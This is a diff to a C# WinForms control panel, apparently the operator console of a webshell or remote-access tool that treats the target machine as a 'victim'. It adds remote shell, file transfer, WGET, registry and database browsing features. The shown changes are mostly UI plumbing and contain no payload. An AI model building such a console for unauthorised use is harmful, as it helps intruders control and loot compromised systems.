@@ -252,7 +252,7 @@ namespace Alien
                     DataTable dt = await m_dbMgr.fnSqlQuery(m_config, szSQL);
 
                     richTextBox.AppendText("\n\nExecute SQL result:\n\n");
-                    fnPrintTable(dt);
+                    richTextBox.AppendText(clsfnDb.fnPrintTable(dt));
                     richTextBox.AppendText("\n");
 
                     richTextBox.AppendText(m_szPrompt);
@@ -260,65 +260,28 @@ namespace Alien
                     m_nPromitStart = richTextBox.TextLength;
                 };
             }
+        }
+        private class clsDbInformation
+        {
+            public TabPage m_page { get; init; }
+            public clsfnDb.stDbConfig m_config { get; init; }
 
-            public void fnPrintTable(DataTable dt)
+            public RichTextBox richTextBox { get; init; }
+            
+            public clsDbInformation(TabPage page, clsfnDb.stDbConfig config)
             {
-                if (dt == null || dt.Columns.Count == 0)
-                    return;
+                m_page = page;
+                m_config = config;
 
-                int[] nWidths = new int[dt.Columns.Count];
+                richTextBox = new RichTextBox();
 
-                // Calculate widths
-                for (int i = 0; i < dt.Columns.Count; i++)
-                {
-                    nWidths[i] = dt.Columns[i].ColumnName.Length;
+                page.Tag = this;
+                page.Controls.Add(richTextBox);
 
-                    foreach (DataRow dr in dt.Rows)
-                    {
-                        string szValue = dr[i]?.ToString() ?? string.Empty;
-                        nWidths[i] = Math.Max(nWidths[i], szValue.Length);
-                    }
-                }
-
-                StringBuilder sb = new StringBuilder();
-
-                string szSeparate =
-                    "+" + string.Join("+", nWidths.Select(w => new string('-', w + 2))) + "+";
-
-                sb.AppendLine(szSeparate);
-
-                // Header
-                sb.Append("|");
-                for (int i = 0; i < dt.Columns.Count; i++)
-                {
-                    sb.Append(" ");
-                    sb.Append(dt.Columns[i].ColumnName.PadRight(nWidths[i]));
-                    sb.Append(" |");
-                }
-
-                sb.AppendLine();
-                sb.AppendLine(szSeparate);
-
-                // Rows
-                foreach (DataRow dr in dt.Rows)
-                {
-                    sb.Append("|");
-
-                    for (int i = 0; i < dt.Columns.Count; i++)
-                    {
-                        string szValue = dr[i]?.ToString() ?? string.Empty;
-
-                        sb.Append(" ");
-                        sb.Append(szValue.PadRight(nWidths[i]));
-                        sb.Append(" |");
-                    }
-
-                    sb.AppendLine();
-                }
-
-                sb.AppendLine(szSeparate);
-
-                richTextBox.AppendText(sb.ToString());
+                richTextBox.Dock = DockStyle.Fill;
+                richTextBox.BackColor = Color.Black;
+                richTextBox.ForeColor = Color.White;
+                richTextBox.Font = new Font("Consolas", page.Font.Size);
             }
         }
 
@@ -586,6 +549,12 @@ namespace Alien
         async void fnFileDirExists(string szDirPath)
         {
             szDirPath = await m_fileMgr.fnszCheckPathExists(szDirPath);
+            if (string.IsNullOrEmpty(szDirPath))
+            {
+                textBox1.Text = m_fileMgr.m_szCurrentPath;
+                return;
+            }
+
             fnFileAddPathToTreeView(szDirPath);
 
             TreeNode node = fnFindNodeWithFullPath(treeView3.Nodes, szDirPath);
@@ -613,7 +582,7 @@ namespace Alien
                 }
 
                 string szFileName = Path.GetFileName(szSrcFilePath);
-                TreeNode node = new TreeNode($"{szFileName}[0%|0/{nFileSize}]");
+                TreeNode node = new TreeNode($"[0%|0/{nFileSize}]{szFileName}");
                 node.Tag = 0;
                 nodeUpload.Nodes.Add(node);
 
@@ -652,7 +621,7 @@ namespace Alien
                             node.Tag = nProgress;
 
                             string szProgress = (((decimal)nProgress / nFileSize) * 100).ToString("0.00");
-                            node.Text = $"{szFileName}[{szProgress}%|{nProgress}/{nFileSize}]";
+                            node.Text = $"[{szProgress}%|{nProgress}/{nFileSize}]{szFileName}";
 
                             if (nProgress >= nFileSize)
                             {
@@ -709,7 +678,7 @@ namespace Alien
 
                 string szFileName = Path.GetFileName(szRemoteFilePath);
 
-                TreeNode node = new TreeNode($"{szFileName}[0%|0/{nFileSize}]");
+                TreeNode node = new TreeNode($"[0%|0/{nFileSize}]{szFileName}");
                 node.Tag = 0;
                 nodeDownload.Nodes.Add(node);
 
@@ -745,7 +714,7 @@ namespace Alien
                             node.Tag = nProgress;
 
                             string szProgress = (((decimal)nProgress / nFileSize) * 100).ToString("0.00");
-                            node.Text = $"{szFileName}[{szProgress}%|{nProgress}/{nFileSize}]";
+                            node.Text = $"[{szProgress}%|{nProgress}/{nFileSize}]{szFileName}";
 
                             if (nProgress >= nFileSize)
                             {
@@ -854,6 +823,9 @@ namespace Alien
         public async void fnDbInit()
         {
             // UI init
+
+            toolStripLabel1.Text = "Loading...";
+
             treeView2.Nodes.Clear();
             listView4.Items.Clear();
             foreach (TabPage tab in tabControl4.TabPages)
@@ -885,6 +857,8 @@ namespace Alien
 
                 treeView2.Nodes.Add(node);
             }
+
+            toolStripLabel1.Text = $"Database[{treeView2.Nodes.Count}]";
         }
 
         void fnDbShowTablePage(TreeNode nodeSelected, string szHost, string szDbName, List<string> lsTable)
@@ -945,6 +919,8 @@ namespace Alien
             if (ctrls.m_lsLastTable.Count > 0)
                 ctrls.m_lsLastTable.Clear();
 
+            List<string> lsExistedTable = nodeSelected.Nodes.Cast<TreeNode>().Select(x => x.Text).ToList();
+
             foreach (string szTable in lsTable)
             {
                 if (ctrls.listView.FindItemWithText(szTable) == null)
@@ -958,6 +934,9 @@ namespace Alien
                 string szNodePath = $"{szHost}\\{szDbName}\\{szTable}";
                 if (fnFindNodeWithFullPath(nodeSelected.Nodes, szNodePath) == null)
                 {
+                    if (lsExistedTable.Contains(szTable))
+                        continue;
+
                     TreeNode node = new TreeNode(szTable);
                     node.ImageKey = "table";
                     node.SelectedImageKey = node.ImageKey;
@@ -1031,7 +1010,7 @@ namespace Alien
 
                     if (dt != null)
                     {
-                        ctrls.fnPrintTable(dt);
+                        ctrls.richTextBox.AppendText(clsfnDb.fnPrintTable(dt));
                         ctrls.richTextBox.AppendText("\n");
                     }
 
@@ -1071,6 +1050,43 @@ namespace Alien
             };
         }
 
+        async void fnDbShowInformation(clsfnDb.stDbConfig config)
+        {
+            TabPage page = new TabPage($"Info[{config.szSource}]");
+            foreach (TabPage p in tabControl4.TabPages)
+            {
+                if (string.Equals(p.Text, page.Text))
+                {
+                    page = p;
+                    break;
+                }
+            }
+
+            if (!tabControl4.TabPages.Contains(page))
+                tabControl4.TabPages.Add(page);
+
+            tabControl4.SelectedTab = page;
+
+            clsDbInformation ctrls = new clsDbInformation(page, config);
+
+            DataTable dt = await m_dbMgr.fnDbInfo(config);
+            DataTable dtNew = new DataTable();
+
+            dtNew.Columns.Add("Field");
+            dtNew.Columns.Add("Value");
+
+            for (int i = 0; i < dt.Columns.Count; i++)
+            {
+                DataColumn dc = dt.Columns[i];
+                DataRow dr = dt.Rows[0];
+
+                dtNew.Rows.Add(dc.ColumnName, dr[i]);
+            }
+
+            ctrls.richTextBox.Clear();
+            ctrls.richTextBox.AppendText(clsfnDb.fnPrintTable(dtNew));
+        }
+
         #endregion
         #region Run Code
 
@@ -1095,11 +1111,17 @@ namespace Alien
             var dicHives = await m_winReg.fnHives();
 
             TreeNode nodePC = new TreeNode("Computer");
+            nodePC.ImageKey = "computer";
+            nodePC.SelectedImageKey = nodePC.ImageKey;
+
             treeView5.Nodes.Add(nodePC);
 
             foreach (string szKey in dicHives.Keys)
             {
                 TreeNode node = new TreeNode(szKey);
+                node.ImageKey = "key";
+                node.SelectedImageKey = node.ImageKey;
+
                 nodePC.Nodes.Add(node);
             }
 
@@ -1109,6 +1131,11 @@ namespace Alien
         #endregion
 
         #endregion
+
+        async void fnClose()
+        {
+
+        }
 
         async void fnSetup()
         {
@@ -1138,6 +1165,23 @@ namespace Alien
             m_ctrlPostEditor.BringToFront();
 
             toolStripStatusLabel3.Text = string.Empty;
+
+            if (m_victim.m_bUnixLike)
+            {
+                // Linux
+
+                TabPage page = tabControl1.TabPages[6];
+                tabControl1.TabPages.Remove(page);
+            }
+            else
+            {
+                // Windows
+
+                TabPage page = tabControl1.TabPages[5];
+                tabControl1.TabPages.Remove(page);
+
+                await fnRegInit();
+            }
 
             var fileInit = await m_fileMgr.fnszInit();
 
@@ -1204,7 +1248,8 @@ namespace Alien
             };
             webViewShell.SizeChanged += async (s, e) =>
             {
-                await webViewShell.CoreWebView2.ExecuteScriptAsync("fitTerminal();");
+                if (webViewShell.CoreWebView2 != null)
+                    await webViewShell.CoreWebView2.ExecuteScriptAsync("fitTerminal();");
             };
 
             await webViewLinuxShell.EnsureCoreWebView2Async(null);
@@ -1301,10 +1346,6 @@ namespace Alien
 
                 tabControl4.SelectedTab = draggedTab;
             };
-
-            // Windows registry
-            await fnRegInit();
-
         }
 
         private void frmControlPanel_Load(object sender, EventArgs e)
@@ -1485,7 +1526,7 @@ namespace Alien
         }
 
         //Upload
-        private void toolStripMenuItem8_Click(object sender, EventArgs e)
+        private async void toolStripMenuItem8_Click(object sender, EventArgs e)
         {
             OpenFileDialog ofd = new OpenFileDialog();
             ofd.Multiselect = true;
@@ -1496,7 +1537,7 @@ namespace Alien
 
                 tabControl6.SelectedIndex = 1;
 
-                fnFileUpload(lsSrcFiles, 3, 1024 * 10, fnFileMgrRefresh);
+                await fnFileUpload(lsSrcFiles, 3, 1024 * 10, fnFileMgrRefresh);
             }
         }
 
@@ -1536,7 +1577,8 @@ namespace Alien
         //WGET
         private void toolStripMenuItem10_Click(object sender, EventArgs e)
         {
-
+            frmWGET f = new frmWGET(m_fileMgr, this);
+            f.Show();
         }
 
         //Parent
@@ -1610,13 +1652,29 @@ namespace Alien
             {
                 //Show databases
 
-                var config = m_dbMgr.m_stDbConfig[node.Text];
-                DataTable dt = await m_dbMgr.fnSqlQuery(config, "SHOW DATABASES;");
+                toolStripLabel2.Text = "Loading...";
 
-                foreach (DataRow dr in dt.Rows)
+                var config = m_dbMgr.m_stDbConfig[node.Text];
+                var result = await m_dbMgr.fnSqlQueryEx(config, m_dbMgr.m_dicShowDatabaseSQL[config.enDbType]);
+
+                if (!result.bSuccess)
+                {
+                    MessageBox.Show(result.szErrorMsg, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    toolStripLabel2.Text = "Action failed!";
+
+                    return;
+                }
+
+                List<string> lsDb = node.Nodes.Cast<TreeNode>().Select(x => x.Text).ToList();
+
+                foreach (DataRow dr in result.dtOutput.Rows)
                 {
                     string? szDb = dr[0].ToString();
                     if (string.IsNullOrEmpty(szDb))
+                        continue;
+
+                    szDb = szDb.Replace("$(DATABASE)", config.szSource);
+                    if (lsDb.Contains(szDb))
                         continue;
 
                     TreeNode nodeDb = new TreeNode(szDb);
@@ -1629,10 +1687,14 @@ namespace Alien
                 node.Expand();
 
                 textBox2.Text = config.szConnString;
+
+                toolStripLabel2.Text = "Action successfully.";
             }
             else if (node.Parent != null && node.Parent.Parent == null)
             {
                 // Table -> Show items
+
+                toolStripLabel2.Text = "Loading...";
 
                 string szHost = node.Parent.Text;
                 string szDbName = node.Text;
@@ -1643,24 +1705,31 @@ namespace Alien
                 if (lsTables.Count == 0)
                 {
                     MessageBox.Show($"Cannot find any table in \"{szDbName}\"", "It is empty!", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                    
                     return;
                 }
 
                 fnDbShowTablePage(node, szHost, szDbName, lsTables);
+
+                toolStripLabel2.Text = "Action successfully.";
             }
             else if (node.Parent != null && node.Parent.Parent != null && node.Parent.Parent.Parent == null)
             {
                 // Show data
 
+                toolStripLabel2.Text = "Loading...";
+
                 string szHost = node.Parent.Parent.Text;
                 string szDbName = node.Parent.Text;
                 string szTable = node.Text;
 
-                string szQuery = $"SELECT * FROM `{szDbName}`.`{szTable}` LIMIT 100;";
                 var config = m_dbMgr.m_stDbConfig[szHost];
+                string szQuery = m_dbMgr.fnBuildDataQuery(config.enDbType, szDbName, szTable, 100);
                 DataTable dt = await m_dbMgr.fnSqlQuery(config, szQuery);
 
                 fnDbShowData(config, dt, szQuery);
+
+                toolStripLabel2.Text = "Action successfully.";
             }
         }
 
@@ -1675,7 +1744,7 @@ namespace Alien
                 node = node.Parent;
 
             var cfg = (clsfnDb.stDbConfig)node.Tag;
-
+            fnDbShowInformation(cfg);
         }
 
         // Database.SQL
@@ -1795,6 +1864,15 @@ namespace Alien
 
             timerShell.Interval = 300;
             timerShell.Start();
+
+            textBox5.Text = "whoami";
+
+            ToolTip tip = new ToolTip();
+            tip.IsBalloon = true;
+            tip.ToolTipIcon = ToolTipIcon.Info;
+            tip.ToolTipTitle = "Please type here!";
+
+            tip.Show("Typing at this textbox is recommanded", textBox5);
         }
 
         private async void button2_Click(object sender, EventArgs e)
@@ -1907,9 +1985,13 @@ namespace Alien
             if (nodeSelected == null)
                 return;
 
+            textBox7.Text = nodeSelected.FullPath;
+
             if (nodeSelected.Parent == null)
             {
                 //Computer
+
+                toolStripStatusLabel4.Text = "Loading...";
 
                 var result = await m_winReg.fnHives();
                 foreach (string szKey in result.Keys)
@@ -1917,14 +1999,21 @@ namespace Alien
                     if (result[szKey])
                     {
                         TreeNode node = new TreeNode(szKey);
+                        node.ImageKey = "key";
+                        node.SelectedImageKey = node.ImageKey;
+
                         if (fnFindNodeWithFullPath(treeView5.Nodes, $"Computer\\{node.Text}") == null)
                             nodeSelected.Nodes.Add(node);
                     }
                 }
+
+                toolStripStatusLabel4.Text = $"Action successfully | Key[{nodeSelected.Nodes.Count}] Value [{listView3.Items.Count}]";
             }
             else
             {
                 // Scan
+
+                toolStripStatusLabel4.Text = "Loading...";
 
                 var result = await m_winReg.fnScan(nodeSelected.FullPath.Replace("Computer\\", string.Empty));
                 if (result == null)
@@ -1937,6 +2026,9 @@ namespace Alien
                         continue;
 
                     TreeNode node = new TreeNode(szSubKey.Replace(nodeSelected.FullPath.Replace("Computer\\", string.Empty) + "\\", string.Empty));
+                    node.ImageKey = "key";
+                    node.SelectedImageKey = node.ImageKey;
+
                     nodeSelected.Nodes.Add(node);
                 }
 
@@ -1950,9 +2042,12 @@ namespace Alien
                     ListViewItem item = new ListViewItem(value.Name);
                     item.SubItems.Add(value.Type);
                     item.SubItems.Add(clsfnReg.fnFormatRegistryValue(value.Type, value.Data));
+                    item.ImageKey = value.Type.Contains("SZ") ? "reg_ab" : "reg_01";
 
                     listView3.Items.Add(item);
                 }
+
+                toolStripStatusLabel4.Text = $"Action successfully | Key[{nodeSelected.Nodes.Count}] Value [{listView3.Items.Count}]";
             }
         }
 
@@ -1964,7 +2059,7 @@ namespace Alien
 
                 textBox3.Clear();
                 richTextBox2.Clear();
-                
+
                 richTextBox2.AppendText(szResp);
             }
             else if (e.KeyCode == Keys.Up)
@@ -1975,6 +2070,11 @@ namespace Alien
             {
 
             }
+        }
+
+        private void frmControlPanel_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            fnClose();
         }
     }
 }
